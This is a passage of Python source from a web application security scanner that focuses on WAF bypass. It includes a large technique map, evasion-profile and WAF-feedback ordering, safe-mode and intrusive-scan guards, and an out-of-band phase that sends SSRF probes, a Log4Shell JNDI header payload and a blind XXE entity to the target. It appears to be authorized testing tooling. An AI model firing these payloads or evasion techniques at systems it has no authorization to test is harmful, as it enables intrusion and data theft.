            '_test_origin_header_bypass': self._test_origin_header_bypass,
            '_test_custom_header_fuzzing': self._test_custom_header_fuzzing,
            '_test_ip_spoofing_headers': self._test_ip_spoofing_headers,
            '_test_host_header_attacks': self._test_host_header_attacks,
            '_test_encoding_bypass': self._test_encoding_bypass,
            '_test_double_encoding': self._test_double_encoding,
            '_test_case_manipulation': self._test_case_manipulation,
            '_test_comment_injection': self._test_comment_injection,
            '_test_whitespace_manipulation': self._test_whitespace_manipulation,
            '_test_unicode_normalization': self._test_unicode_normalization,
            '_test_payload_mutation': self._test_payload_mutation,
            '_test_polyglot_payloads': self._test_polyglot_payloads,
            '_test_path_normalization_extended': self._test_path_normalization_extended,
            '_test_method_bypass': self._test_method_bypass,
            '_test_http_method_override': self._test_http_method_override,
            '_test_content_type_bypass': self._test_content_type_bypass,
            '_test_http_parameter_pollution': self._test_http_parameter_pollution,
            '_test_transfer_encoding_smuggling': self._test_transfer_encoding_smuggling,
            '_test_http2_downgrade': self._test_http2_downgrade,
            '_test_http2_specific_attacks': self._test_http2_specific_attacks,
            '_test_websocket_upgrade': self._test_websocket_upgrade,
            '_test_websocket_security': self._test_websocket_security,
            '_test_chunked_transfer': self._test_chunked_transfer,
            '_test_http_pipelining': self._test_http_pipelining,
            '_test_request_smuggling_v2': self._test_request_smuggling_v2,
            '_test_http_desync': self._test_http_desync,
            '_test_verb_tampering_extended': self._test_verb_tampering_extended,
            '_test_multipart_bypass': self._test_multipart_bypass,
            '_test_cache_control': self._test_cache_control,
            '_test_range_header': self._test_range_header,
            '_test_cache_poisoning': self._test_cache_poisoning,
            '_test_web_cache_deception': self._test_web_cache_deception,
            '_test_range_header_attacks': self._test_range_header_attacks,
            '_test_sqli_bypass': self._test_sqli_bypass,
            '_test_xss_bypass': self._test_xss_bypass,
            '_test_command_injection_bypass': self._test_command_injection_bypass,
            '_test_command_injection_windows': self._test_command_injection_windows,
            '_test_path_traversal_bypass': self._test_path_traversal_bypass,
            '_test_nosql_injection': self._test_nosql_injection,
            '_test_ldap_injection': self._test_ldap_injection,
            '_test_ssti_detection': self._test_ssti_detection,
            '_test_xxe_detection': self._test_xxe_detection,
            '_test_crlf_injection': self._test_crlf_injection,
            '_test_prototype_pollution': self._test_prototype_pollution,
            '_test_json_injection': self._test_json_injection,
            '_test_deserialization': self._test_deserialization,
            '_test_ssi_injection': self._test_ssi_injection,
            '_test_log4shell_patterns': self._test_log4shell_patterns,
            '_test_dangling_markup': self._test_dangling_markup,
            '_test_css_injection': self._test_css_injection,
            '_test_xslt_injection': self._test_xslt_injection,
            '_test_cors_misconfiguration': self._test_cors_misconfiguration,
            '_test_open_redirect': self._test_open_redirect,
            '_test_security_headers': self._test_security_headers,
            '_test_cookie_security': self._test_cookie_security,
            '_test_clickjacking': self._test_clickjacking,
            '_test_content_sniffing': self._test_content_sniffing,
            '_test_response_splitting': self._test_response_splitting,
            '_test_api_versioning_bypass': self._test_api_versioning_bypass,
            '_test_mass_assignment': self._test_mass_assignment,
            '_test_idor_detection': self._test_idor_detection,
            '_test_business_logic_flaws': self._test_business_logic_flaws,
            '_test_email_header_injection': self._test_email_header_injection,
            '_test_file_upload_bypass': self._test_file_upload_bypass,
            '_test_rate_limit_detection': self._test_rate_limit_detection,
            '_test_race_condition': self._test_race_condition,
            '_test_jwt_oauth_bypass': self._test_jwt_oauth_bypass,
            '_test_jwt_attacks': self._test_jwt_attacks,
            '_test_graphql_bypass': self._test_graphql_bypass,
            '_test_graphql_deep_testing': self._test_graphql_deep_testing,
            '_test_ssrf_bypass': self._test_ssrf_bypass,
            '_test_ssrf_protocol_smuggling': self._test_ssrf_protocol_smuggling,
            '_test_dns_rebinding': self._test_dns_rebinding,
            '_test_pdf_injection': self._test_pdf_injection,
            '_test_postmessage_vulnerabilities': self._test_postmessage_vulnerabilities,
            '_test_rpo_attack': self._test_rpo_attack,
            '_test_azure_blob_enumeration': self._test_azure_blob_enumeration,
            '_test_gcp_bucket_discovery': self._test_gcp_bucket_discovery,
            '_test_serverless_functions': self._test_serverless_functions,
            '_test_kubernetes_api': self._test_kubernetes_api,
            '_test_cloud_provider_detection': self._test_cloud_provider_detection,
            '_test_cloud_metadata_enumeration': self._test_cloud_metadata_enumeration,
            '_test_time_based_detection': self._test_time_based_detection,
            '_test_buffer_limits': self._test_buffer_limits,
            '_test_integer_overflow': self._test_integer_overflow,
            '_test_bot_detection_evasion': self._test_bot_detection_evasion,
            '_test_ipv6_bypass': self._test_ipv6_bypass,
            '_test_information_disclosure': self._test_information_disclosure,
            '_test_subdomain_takeover': self._test_subdomain_takeover,
            '_test_api_key_exposure': self._test_api_key_exposure,
            '_test_timing_based_discovery': self._test_timing_based_discovery,
            '_test_error_based_disclosure': self._test_error_based_disclosure,
            '_detect_waf_rule_version': self._detect_waf_rule_version,
            '_detect_javascript_waf': self._detect_javascript_waf,
            '_test_api_endpoint_discovery': self._test_api_endpoint_discovery,
            '_test_dns_zone_transfer': self._test_dns_zone_transfer,
            '_enumerate_subdomains': self._enumerate_subdomains,
            '_historical_dns_lookup': self._historical_dns_lookup,
            '_certificate_transparency_lookup': self._certificate_transparency_lookup,
            '_fingerprint_technology_stack': self._fingerprint_technology_stack,
            # New modules (v1.5)
            '_test_json_sqli_bypass': self._test_json_sqli_bypass,
            '_test_charset_confusion': self._test_charset_confusion,
            '_test_cache_poisoning_deep': self._test_cache_poisoning_deep,
            '_test_oauth_oidc': self._test_oauth_oidc,
            '_test_js_secret_exposure': self._test_js_secret_exposure,
            '_test_cve_fingerprint': self._test_cve_fingerprint,
            '_test_single_packet_race': self._test_single_packet_race,
            '_test_cloud_metadata_v2': self._test_cloud_metadata_v2,
            '_test_dom_xss': self._test_dom_xss,
            '_test_client_side_path_traversal': self._test_client_side_path_traversal,
            '_test_mutation_fuzzing': self._test_mutation_fuzzing,
            '_test_content_discovery': self._test_content_discovery,
            '_test_s3_bucket_enum': self._test_s3_bucket_enum,
            '_test_websocket_fuzzing': self._test_websocket_fuzzing,
            # New modules (v1.6)
            '_test_csp_analysis': self._test_csp_analysis,
            '_test_jwt_jwk_injection': self._test_jwt_jwk_injection,
            '_test_graphql_csrf': self._test_graphql_csrf,
            '_test_smuggling_cl0': self._test_smuggling_cl0,
            '_test_saml_xsw': self._test_saml_xsw,
            '_test_auth_logic': self._test_auth_logic,
            '_test_llm_prompt_injection': self._test_llm_prompt_injection,
            '_test_grpc_detection': self._test_grpc_detection,
            '_test_http3_detection': self._test_http3_detection,
        }
        
        # Build technique list from selected categories
        added_techniques = set()
        for category_key in selected_categories:
            if category_key in SCAN_CATEGORIES:
                category = SCAN_CATEGORIES[category_key]
                print(f"[*] Loading category: {category['name']}")
                for technique_name in category['techniques']:
                    if technique_name in technique_map and technique_name not in added_techniques:
                        techniques.append(technique_map[technique_name])
                        added_techniques.add(technique_name)

        # Honor an evasion profile's curated technique list (augments selection).
        profile_techniques = (self.evasion_profile or {}).get('techniques')
        if profile_techniques:
            for technique_name in profile_techniques:
                if technique_name in technique_map and technique_name not in added_techniques:
                    techniques.append(technique_map[technique_name])
                    added_techniques.add(technique_name)
            print(f"[*] Evasion profile added {len(profile_techniques)} curated technique(s)")

        # WAF feedback loop: run historically-effective techniques first.
        if self.feedback_db and self._detected_waf_type:
            try:
                prio = self.feedback_db.get_prioritized_techniques(self._detected_waf_type)
                if prio:
                    order = {name: i for i, name in enumerate(prio)}
                    techniques.sort(key=lambda t: order.get(getattr(t, '__name__', ''), 10_000))
                    matched = sum(1 for t in techniques if getattr(t, '__name__', '') in order)
                    print(f"[*] WAF feedback: prioritized {matched} learned technique(s) "
                          f"for {self._detected_waf_type}")
            except Exception as e:
                logger.debug(f"Feedback reorder error: {e}")

        # Do not run checks the current engines cannot express or prove.
        disabled_names = (
            self.DISABLED_TRANSPORT_TECHNIQUES
            | self.DISABLED_ACCURACY_TECHNIQUES
        )
        before = len(techniques)
        techniques = [
            technique for technique in techniques
            if getattr(technique, '__name__', '') not in disabled_names
        ]
        disabled = before - len(techniques)
        if disabled:
            print(f"[*] Accuracy guard: disabled {disabled} technique(s) that "
                  "require a specialized proof-capable engine")

        # Guessed state-changing workflows are never implicit. An authorization
        # allowlist controls scope; --intrusive separately controls impact.
        if not self.intrusive:
            before = len(techniques)
            techniques = [
                technique for technique in techniques
                if getattr(technique, '__name__', '') not in self.INTRUSIVE_WORKFLOW_SKIP
            ]
            skipped = before - len(techniques)
            if skipped:
                print(f"[*] Intrusive workflow guard: skipped {skipped} technique(s); "
                      "use --intrusive only with explicit impact authorization")

        # Safe mode: drop noisy / DoS-flavored / state-changing techniques.
        if self.safe_mode:
            before = len(techniques)
            techniques = [t for t in techniques
                          if getattr(t, '__name__', '') not in self.SAFE_MODE_SKIP]
            skipped = before - len(techniques)
            if skipped:
                print(f"[*] Safe mode: skipped {skipped} noisy/destructive technique(s)")

        # Filter techniques based on detected OS
        original_count = len(techniques)
        techniques = self._filter_techniques_by_os(techniques, detected_os)
        filtered_count = original_count - len(techniques)
        
        if filtered_count > 0:
            print(f"[*] Running {len(techniques)} techniques from {len(selected_categories)} categories")
            print(f"    ({filtered_count} techniques filtered out - not compatible with {detected_os.upper() if detected_os != 'unknown' else 'detected OS'})\n")
        else:
            print(f"[*] Running {len(techniques)} techniques from {len(selected_categories)} categories\n")
        
        # Resume: load a prior checkpoint, restore findings, skip finished techniques.
        if self.resume:
            try:
                from . import checkpoint as _ckpt
                saved = _ckpt.load(self.target)
                if saved:
                    self._completed_techniques = set(saved.get('completed', []))
                    prior = saved.get('results', [])
                    # Keep prior findings but avoid double-counting detection phase.
                    self.results.extend(prior)
                    print(f"[*] Resuming: {len(self._completed_techniques)} technique(s) "
                          f"already done, {len(prior)} prior finding(s) restored")
            except Exception as e:
                logger.debug(f"Resume load error: {e}")

        # Execute techniques against ONE shared, bounded thread pool.
        # Each technique runs sequentially and fans its own requests out across this
        # pool, so total in-flight requests never exceed self.threads (no nested
        # pool explosion). The adaptive limiter throttles further under WAF pushback.
        error_count = 0
        max_time = getattr(self, 'max_time', 0) or 0
        self._executor = ThreadPoolExecutor(max_workers=self.threads)
        try:
            for idx, technique in enumerate(techniques):
                # Overall scan budget: stop launching new techniques past the deadline.
                if max_time and (time.monotonic() - self._scan_start) > max_time:
                    remaining = len(techniques) - idx
                    msg = (f"--max-time {max_time}s reached after {idx} technique(s); "
                           f"skipping {remaining} remaining")
                    logger.warning(msg)
                    print(f"\n[!] {msg}")
                    break
                tname = getattr(technique, '__name__', '?')
                if self.resume and tname in self._completed_techniques:
                    continue
                try:
                    result = technique()
                    if result:
                        self.results.extend(result)
                    # Feed the learning loop: did this technique fire on this WAF?
                    if self.feedback_db and self._detected_waf_type:
                        had_bypass = bool(result) and any(
                            isinstance(r, dict) and r.get('bypass') for r in result)
                        try:
                            self.feedback_db.record_technique_outcome(
                                self._detected_waf_type, tname, had_bypass)
                        except Exception:
                            pass
                    # Checkpoint progress for resumable scans.
                    if self.resume:
                        self._completed_techniques.add(tname)
                        try:
                            from . import checkpoint as _ckpt
                            _ckpt.save(self.target, list(self._completed_techniques), self.results)
                        except Exception:
                            pass
                except KeyboardInterrupt:
                    logger.warning("Scan interrupted by user")
                    raise ScanInterruptedError("Scan interrupted by user")
                except Exception as e:
                    error_count += 1
                    logger.error(f"Error in {technique.__name__}: {e}")
                    # Continue with other techniques

            # Run user plugins + AI triage as post-processing phases.
            try:
                self._run_plugins(selected_categories)
            except Exception as e:
                logger.debug(f"Plugin phase error: {e}")
        except KeyboardInterrupt:
            logger.warning("Scan interrupted by user")
            raise ScanInterruptedError("Scan interrupted by user")
        finally:
            self._executor.shutdown(wait=True)
            self._executor = None

        if error_count > 0:
            logger.warning(f"Scan completed with {error_count} technique errors")
            print(f"\n[!] Warning: {error_count} techniques encountered errors")

        # Collect any out-of-band callbacks triggered during the scan; confirmed
        # interactions are proof-carrying CRITICAL findings.
        if self.oob:
            try:
                self.results.extend(self._oob_collect())
            except Exception as e:
                logger.debug(f"OOB collect error: {e}")
            finally:
                try:
                    self.oob.close()
                except Exception:
                    pass

        # Re-confirm flagged bypasses before reporting so transient flukes get
        # demoted rather than shipped as findings.
        if self.reconfirm:
            try:
                self._reconfirm_bypasses(samples=self.reconfirm_samples)
            except Exception as e:
                logger.debug(f"Re-confirmation phase error: {e}")

        # Bring direct/legacy scanner records onto the same explicit state model
        # as the evidence-aware request path before they reach GUI/export/CI.
        self._normalize_result_records()

        # Backfill reproduction commands for any results built outside the
        # _test_request chokepoint (recon/audit/cloud findings).
        self._attach_repro_commands()

        # Attach CVSS base score/vector + CWE for reporting & CI gating.
        try:
            from .cvss import annotate as _cvss_annotate
            _cvss_annotate(self.results)
        except Exception as e:
            logger.debug(f"CVSS annotation error: {e}")

        # The public scan API promises serializable records. Enforce that once
        # at the engine boundary so GUI, redaction, database, exporters, and
        # direct Python callers cannot be broken by a legacy/custom plugin that
        # retained a live response, callback, datetime, or byte buffer.
        self.results[:] = _json_safe_value(self.results)

        # Clean completion: drop the resume checkpoint.
        if self.resume:
            try:
                from . import checkpoint as _ckpt
                _ckpt.clear(self.target)
            except Exception:
                pass

        actionable_count = sum(1 for r in self.results if _is_actionable_result(r))
        logger.info(f"Scan complete: {actionable_count} actionable findings, "
                    f"{len(self.results) - actionable_count} observations")
        return self.results

    @staticmethod
    def looks_like_session_expiry(status: int, body: str) -> bool:
        """Heuristic: does this response look like the auth session expired?
        Pure so it can be unit-tested."""
        if status in (401,):
            return True
        sample = (body or '')[:1500].lower()
        markers = ('please log in', 'please sign in', 'session expired',
                   'login required', 'name="password"', 'your session has expired',
                   'authentication required')
        return any(m in sample for m in markers)

    def _maybe_reauth(self, resp) -> None:
        """Re-run the login flow if the session looks expired (throttled).

        Only active when authenticated scanning was configured with a login flow.
        """
        login = (self.auth or {}).get('login')
        if not isinstance(login, dict) or not login.get('url'):
            return
        try:
            if not self.looks_like_session_expiry(getattr(resp, 'status_code', 0),
                                                  getattr(resp, 'text', '') or ''):
                return
            now = time.time()
            if now - self._last_reauth < 30:   # throttle: at most once / 30s
                return
            self._last_reauth = now
            logger.info("Session looks expired; re-authenticating")
            print("[*] Session expired — re-authenticating")
            self._perform_login(login)
        except Exception as e:
            logger.debug(f"Re-auth error: {e}")

    def _reconfirm_bypasses(self, samples: int = 2, keep_threshold: float = 0.5) -> None:
        """Replay each flagged bypass ``samples`` more times and demote flukes.

        A finding keeps its ``bypass`` flag only if it reproduces in at least
        ``keep_threshold`` of the confirmation attempts. Replays bypass the
        response cache so they actually re-hit the network. Adds ``confidence``
        (high|medium|low|single) and ``confirmations`` ("n/m") to each finding.

        Only HTTP findings addressable as ``target + path`` are replayed; recon /
        detection findings (absolute URLs, no replayable request, or explicitly
        opted out via ``_no_reconfirm``) are marked ``single`` and left intact.
        """
        if self._baseline_size is None:
            return
        targets = [
            r for r in self.results
            if isinstance(r, dict) and r.get('bypass')
            and r.get('path') and not r.get('_no_reconfirm')
            and not str(r.get('path')).startswith(('http://', 'https://'))
        ]
        if not targets:
            return
        print(f"\n[*] Re-confirming {len(targets)} candidate bypass(es) "
              f"({samples} replay(s) each, cache off)...")
        demoted = 0
        for r in targets:
            method = r.get('method', 'GET')
            path = r.get('path', '/')
            headers = r.get('headers') if isinstance(r.get('headers'), dict) else {}
            data = r.get('data')
            expected_detector = str(r.get('detector_id') or '')
            expected_signals = {
                str(item.get('type')) for item in (r.get('evidence') or [])
                if isinstance(item, dict) and item.get('type')
            }
            originally_confirmed = (
                str(r.get('verification_status') or '').lower() == 'confirmed'
            )
            confirmed = 0
            for _ in range(samples):
                try:
                    replay = self._test_request(
                        dict(headers), method=method, path=path,
                        technique=r.get('technique'), data=data, use_cache=False,
                        probe=dict(r.get('probe') or {}),
                    )
                except Exception:
                    replay = None
                if not replay or not replay.get('bypass'):
                    continue
                replay_detector = str(replay.get('detector_id') or '')
                replay_signals = {
                    str(item.get('type')) for item in (replay.get('evidence') or [])
                    if isinstance(item, dict) and item.get('type')
                }
                same_detector = (
                    not expected_detector or replay_detector == expected_detector
                )
                same_signal = not expected_signals or bool(
                    expected_signals & replay_signals
                )
                same_strength = (
                    not originally_confirmed
                    or str(replay.get('verification_status') or '').lower() == 'confirmed'
                )
                if same_detector and same_signal and same_strength:
                    confirmed += 1
            ratio = (confirmed / samples) if samples else 0.0
            r['confirmations'] = f"{confirmed}/{samples}"
            if ratio >= keep_threshold:
                # Repetition cannot turn a generic content-delta candidate into
                # detector-specific proof. Preserve the original verification
                # state while recording stability separately.
                if r.get('verification_status') == 'confirmed':
                    r['confidence'] = 'high' if ratio == 1.0 else 'medium'
                else:
                    r['confidence'] = 'medium' if ratio == 1.0 else 'low'
            else:
                r['bypass'] = False
                r['confidence'] = 'low'
                r['verification_status'] = 'unconfirmed'
                r['kind'] = 'suspected'
                r['reason'] = f"Unconfirmed (reproduced {confirmed}/{samples}): {r.get('reason', '')}"
                demoted += 1
        if demoted:
            print(f"[+] Re-confirmation demoted {demoted} unstable finding(s) to low confidence")
        else:
            print("[+] All candidate bypasses re-confirmed")

    # ------------------------------------------------------------------ #
    # Out-of-band confirmation
    # ------------------------------------------------------------------ #
    def _oob_spray(self) -> None:
        """Fire blind-vuln payloads that make the TARGET call back to our OOB
        server. Each payload embeds a uniquely-correlated callback so a received
        interaction can be attributed to the exact vector. Runs early so the rest
        of the scan doubles as the wait window; results are gathered later by
        :meth:`_oob_collect`.
        """
        if not self.oob:
            return
        print("\n[*] OOB phase: spraying blind-vuln callbacks (SSRF / Log4Shell / XXE)...")
        self._oob_spray_time = time.time()

        def mint(label: str):
            try:
                return self.oob.register(label=label)
            except Exception as e:
                logger.debug(f"OOB register failed: {e}")
                return None

        # 1) SSRF via common request parameters on discovered endpoints + root.
        ssrf_params = ['url', 'uri', 'next', 'dest', 'redirect', 'target', 'u',
                       'link', 'callback', 'feed', 'host', 'site', 'path',
                       'continue', 'image', 'imageurl', 'domain', 'out']
        targets = self._injection_targets() or [{'path': '/', 'params': {}}]
        for t in targets[:5]:
            path = t.get('path', '/')
            for p in ssrf_params[:8]:
                h = mint('ssrf')
                if not h:
                    continue
                sep = '&' if '?' in path else '?'
                probe = f"{path}{sep}{p}={quote(h.http_url, safe='')}"
                self._oob_fired[h.token] = ('SSRF', f"param '{p}' on {path}")
                self._test_request(path=probe, technique=f"OOB-SSRF {p}", use_cache=False)

        # 2) Log4Shell / JNDI in headers commonly logged by backends.
        jndi_headers = ['User-Agent', 'Referer', 'X-Api-Version', 'X-Forwarded-For',
                        'X-Forwarded-Host', 'True-Client-IP', 'X-Waf-Test']
        for hdr in jndi_headers:
            h = mint('log4shell')
            if not h:
                continue
            payload = f"${{jndi:ldap://{h.domain}/a}}"
            self._oob_fired[h.token] = ('Log4Shell/JNDI', f"'{hdr}' header")
            self._test_request(headers={hdr: payload},
                               technique=f"OOB-Log4Shell {hdr}", use_cache=False)

        # 3) Blind XXE: external entity fetched over HTTP from our listener.
        h = mint('xxe')
        if h:
            xxe = ('<?xml version="1.0"?>'
                   f'<!DOCTYPE r [<!ENTITY x SYSTEM "{h.http_url}/xxe">]><r>&x;</r>')
            self._oob_fired[h.token] = ('Blind XXE', 'XML body external entity')
            self._test_request(method='POST',
                               headers={'Content-Type': 'application/xml'},
                               data=xxe, technique='OOB-XXE', use_cache=False)

        print(f"  [*] Sprayed {len(self._oob_fired)} correlated OOB payload(s)")

    def _oob_collect(self) -> List[Dict[str, Any]]:
        """Poll the OOB provider and turn received interactions into CONFIRMED,
        proof-carrying CRITICAL findings. Ensures at least ``oob_wait`` seconds
        have elapsed since the spray so slow callbacks aren't missed."""
        if not self.oob:
            return []
        elapsed = time.time() - self._oob_spray_time
        remaining = self.oob_wait - elapsed
        if remaining > 0:
            print(f"[*] OOB: waiting {remaining:.0f}s more for callbacks...")
            time.sleep(remaining)

        try:
            interactions = self.oob.poll()
        except Exception as e:
            logger.debug(f"OOB poll error: {e}")
            interactions = []

        results: List[Dict[str, Any]] = []
        for ix in interactions:
            # De-dup repeated callbacks for the same token/protocol.
            dedup = f"{ix.token}:{ix.protocol}"
            if dedup in self._oob_seen:
                continue
            self._oob_seen.add(dedup)
            vector, where = self._oob_fired.get(ix.token, (None, None))
            if vector is None:
                if ix.token is not None:
                    continue  # belongs to a different correlation id
                vector, where = ('OOB callback', 'unattributed')
            results.append({
                'bypass': True, 'status': 0, 'headers': {}, 'method': 'OOB',
                'path': '/', 'size': 0,
                'technique': f"OOB-CONFIRMED {vector}",
                'reason': (f"Out-of-band {ix.protocol.upper()} callback from target "
                           f"({where}); source={ix.source or '?'}"),
                'severity': 'CRITICAL', 'category': 'OOB',
                'confidence': 'high', 'confirmations': 'oob', '_no_reconfirm': True,
                '_no_repro': True,
                'request': {'available': False,
                            'note': 'OOB proof is correlated to a prior callback probe'},
                'oob': {'protocol': ix.protocol, 'source': ix.source,
                        'raw': ix.raw, 'timestamp': ix.timestamp, 'full_id': ix.full_id},
            })
            print(f"  [✓] OOB CONFIRMED: {vector} via {ix.protocol} from {ix.source or '?'}")
        if not results:
            print("  [-] No OOB callbacks received (no blind vuln confirmed, or callbacks delayed)")
        return results

    def _test_oob_interactions(self) -> List[Dict[str, Any]]:
        """Synchronous OOB confirmation (spray + wait + collect) usable as a
        standalone technique. The scan() flow prefers the split
        spray-early / collect-late path for a free wait window."""
        if not self.oob:
            return []
        self._oob_spray()
        return self._oob_collect()

    def _attach_repro_commands(self) -> None:
        """Ensure every finding carries a copy-paste ``curl`` reproduction.

        Findings produced via :meth:`_test_request` already have one (built from
        the exact wire request). This backfills the rest by merging the live
        session headers with the finding's technique-specific headers.
        """
        try:
            base_headers = dict(self._session.headers)
        except Exception:
            base_headers = {}
        for r in self.results:
            if (not isinstance(r, dict) or r.get('curl') or r.get('_no_repro')
                    or (isinstance(r.get('request'), dict)
                        and r['request'].get('available') is False)):
                continue
            path = r.get('path', '/') or '/'
            if path.startswith('http://') or path.startswith('https://'):
                url = path
            else:
                url = f"{self.target}{path if path.startswith('/') else '/' + path}"
            merged = dict(base_headers)
            extra = r.get('headers')
            if isinstance(extra, dict):
                merged.update(extra)
            try:
                r['curl'] = build_curl(r.get('method', 'GET'), url, merged, r.get('data'))
            except Exception:
                pass

    @staticmethod
    def _default_remediation(result: Dict[str, Any]) -> str:
        haystack = f"{result.get('category', '')} {result.get('technique', '')}".lower()
        if any(k in haystack for k in ('sqli', 'sql injection', 'nosql', 'ldap')):
            return ('Use parameterized queries or safe query builders, validate input by schema, '
                    'and return generic parser errors to clients.')
        if any(k in haystack for k in ('xss', 'dangling', 'css injection')):
            return ('Apply context-aware output encoding, sanitize permitted markup, and enforce '
                    'a restrictive Content Security Policy as defense in depth.')
        if any(k in haystack for k in ('command injection', 'cmdinj', 'ssi')):
            return ('Avoid shell interpretation; invoke fixed executables with argument arrays and '
                    'strict allowlists under a least-privileged account.')
        if any(k in haystack for k in ('traversal', 'lfi', 'file inclusion')):
            return ('Resolve paths against a fixed base directory, reject traversal after '
                    'canonicalization, and use server-side file identifiers.')
        if any(k in haystack for k in ('ssti', 'template')):
            return ('Never render user-controlled text as a template; pass it as data and use a '
                    'sandboxed template environment with dangerous globals removed.')
        if any(k in haystack for k in ('xxe', 'xml')):
            return ('Disable DTD/external-entity and XInclude resolution in every XML parser, and '
                    'restrict parser network/file access.')
        if 'crlf' in haystack or 'response splitting' in haystack:
            return ('Reject CR/LF in header-bound input and use framework header APIs that prevent '
                    'raw response-header construction.')
        if 'prototype' in haystack:
            return ('Reject __proto__/constructor/prototype keys recursively and use null-prototype '
                    'maps or patched object-merge libraries.')
        if 'deserial' in haystack:
            return ('Do not deserialize untrusted native objects; use a typed data format, integrity '
                    'protection, and an explicit class allowlist.')
        return ('Verify the affected request, then constrain the trusted input boundary and add a '
                'regression test for the demonstrated behavior.')

    def _normalize_result_records(self) -> None:
        """Backfill canonical state/evidence fields on every scanner record."""
        observation_categories = {
            'WAF_DETECTION', 'CDN_DETECTION', 'OS_DETECTION', 'API_DISCOVERY',
            'TECH_STACK', 'CT_LOGS', 'SUBDOMAIN_ENUM', 'JSON_INJECTION',
        }
        for result in self.results:
            if not isinstance(result, dict):
                continue
            details = result.get('details') if isinstance(result.get('details'), dict) else {}
            exact_request_known = bool(
                (isinstance(result.get('request'), dict)
                 and (result['request'].get('url') or result['request'].get('path')))
                or result.get('path') or result.get('url') or details.get('endpoint')
            )
            result.setdefault('target', self.target)
            result.setdefault('title', result.get('technique') or 'Blackthorn result')
            if not result.get('payload') and details.get('payload') is not None:
                result['payload'] = details.get('payload')
            result.setdefault('payload', '')
            result.setdefault('method', 'GET')
            if not result.get('path') and details.get('endpoint'):
                endpoint = str(details.get('endpoint'))
                result['path'] = (urlsplit(endpoint).path or '/') if endpoint.startswith(
                    ('http://', 'https://')
                ) else endpoint
            result.setdefault('path', '/' if exact_request_known else '')
            path = str(result.get('path') or '/')
            result.setdefault(
                'url', path if path.startswith(('http://', 'https://')) else self._path_url(path)
            )
            if exact_request_known:
                result.setdefault('request', {
                    'method': result.get('method', 'GET'), 'url': result.get('url'),
                    'path': path, 'headers': dict(result.get('headers') or {}),
                    'body': result.get('data'),
                })
            else:
                result.setdefault('request', {
                    'available': False,
                    'note': 'Legacy detector did not record the exact request',
                })
                result['_no_repro'] = True
            result.setdefault('response', {
                'status': result.get('status', result.get('response_code', 0)),
                'size': result.get('size', 0), 'content_type': '',
                'headers': {}, 'excerpt': '',
            })

            category = str(result.get('category') or 'OTHER').upper()
            if not result.get('kind'):
                if category in observation_categories or not result.get('bypass'):
                    result['kind'] = 'observation'
                    result.setdefault('verification_status', 'informational')
                    result.setdefault('confidence', 'high' if category in observation_categories else 'none')
                elif result.get('oob') or result.get('confirmations') == 'oob':
                    result['kind'] = 'finding'
                    result['verification_status'] = 'confirmed'
                    result['confidence'] = 'high'
                else:
                    # Stable replay is useful, but repeating a legacy heuristic
                    # cannot turn it into vulnerability-specific proof.
                    result['kind'] = 'suspected'
                    result.setdefault('verification_status', 'candidate')
                    result.setdefault('confidence', 'medium')
            result.setdefault('verification_status', 'not_detected')
            result.setdefault('confidence', 'none')
            result.setdefault('evidence', [{
                'type': 'legacy_detector_signal',
                'description': str(result.get('reason') or ''),
                'matched': '', 'excerpt': '',
            }] if result.get('reason') else [])
            result.setdefault('remediation', self._default_remediation(result))
            result.setdefault('observed_at', time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()))

            if not result.get('fingerprint'):
                insertion = result.get('insertion_point') or {}
                family = str(result.get('technique') or '').split(':', 1)[0].lower()
                material = '|'.join([
                    urlparse(self.target).netloc.lower(), str(result.get('method', 'GET')),
                    urlsplit(path).path or '/', category,
                    str(insertion.get('type', '') if isinstance(insertion, dict) else insertion),
                    str(insertion.get('name', '') if isinstance(insertion, dict) else ''),
                    family,
                ])
                result['fingerprint'] = hashlib.sha256(material.encode()).hexdigest()[:24]
            result.setdefault('finding_id', f"bt-{result['fingerprint']}")

        # Negative wire probes belong in debug/HTTP telemetry, not in a security
        # report. Keep meaningful informational observations (technology,
        # headers, discovered assets) while pruning canonical no-signal/rejected
        # transactions from the user-facing result collection.
        self.results[:] = [
            result for result in self.results
            if not (
                isinstance(result, dict)
                and result.get('kind') == 'observation'
                and any(
                    isinstance(item, dict)
                    and item.get('type') in {'no_signal', 'rejected'}
                    for item in (result.get('evidence') or [])
                )
            )
        ]

    def _run_plugins(self, selected_categories=None) -> None:
        """Execute user-supplied bypass plugins as a scan phase.

        Plugins are loaded from the plugins directory and given the live session
        and target. Whatever findings they return are normalized and appended to
        results. A category-limited scan only runs plugins that declare a matching
        category; selecting injection must not silently run an encoding/header
        plugin. Safe no-op if no matching plugins are installed.
        """
        plugins = getattr(self, '_loaded_plugins', None)
        if not plugins:
            return
        if selected_categories:
            category_map = {
                'injection': 'injection_testing',
                'encoding': 'encoding_obfuscation',
                'obfuscation': 'encoding_obfuscation',
                'header': 'header_manipulation',
                'protocol': 'protocol_level',
                'cache': 'cache_control',
                'auth': 'jwt_auth',
                'jwt': 'jwt_auth',
                'graphql': 'graphql_attacks',
                'ai': 'ai_attacks',
                'ssrf': 'ssrf_advanced',
                'cloud': 'cloud_security',
                'business_logic': 'business_logic',
                'info': 'info_disclosure',
                'recon': 'detection_recon',
                'bypass': 'advanced_payloads',
            }
            selected = {str(category).lower() for category in selected_categories}
            plugins = [
                plugin for plugin in plugins
                if category_map.get(
                    str(getattr(plugin, 'category', '')).lower(),
                    str(getattr(plugin, 'category', '')).lower(),
                ) in selected
            ]
            if not plugins:
                return
        print(f"\n[*] Running {len(plugins)} user plugin(s)...")
        for plugin in plugins:
            try:
                if not getattr(plugin, 'enabled', True):
                    continue
                outcome = plugin.execute(self.target, self._session,
                                         baseline_status=self._baseline_status,
                                         baseline_size=self._baseline_size)
                for norm in self._normalize_plugin_results(plugin, outcome):
                    self.results.append(norm)
                    if norm.get('bypass'):
                        confirmed = str(norm.get('verification_status') or '').lower() == 'confirmed'
                        label = 'PLUGIN FINDING' if confirmed else 'PLUGIN CANDIDATE'
                        print(f"  [{'✓' if confirmed else '!'}] {label}: "
                              f"{norm['technique']} | {norm['reason']} | {norm['severity']}")
            except Exception as e:
                logger.debug(f"Plugin '{getattr(plugin, 'name', '?')}' failed: {e}")

    def _normalize_plugin_results(self, plugin, outcome) -> List[Dict[str, Any]]:
        """Coerce a plugin's return value into standard result dicts."""
        if not outcome:
            return []
        items = outcome if isinstance(outcome, list) else [outcome]
        normalized = []
        for item in items:
            if not isinstance(item, dict):
                continue
            norm = dict(item)
            raw_response = norm.get('response')
            if raw_response is not None and not isinstance(raw_response, dict):
                try:
                    response_snapshot = snapshot_response(raw_response, _normalize_body)
